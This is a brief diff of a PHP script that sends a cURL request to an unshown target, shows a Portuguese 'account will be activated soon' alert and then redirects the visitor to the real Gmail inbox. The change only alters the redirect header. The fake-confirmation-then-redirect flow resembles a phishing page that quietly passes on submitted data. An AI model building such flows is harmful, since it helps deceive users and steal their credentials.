@@ -18,6 +18,6 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $exec = curl_exec($ch);
 
 echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
-header( "refresh:0;url=https://mail.google.com/mail/u/0/#inbox");
+header( "Location:https://mail.google.com/mail/u/0/#inbox");
 
 ?>
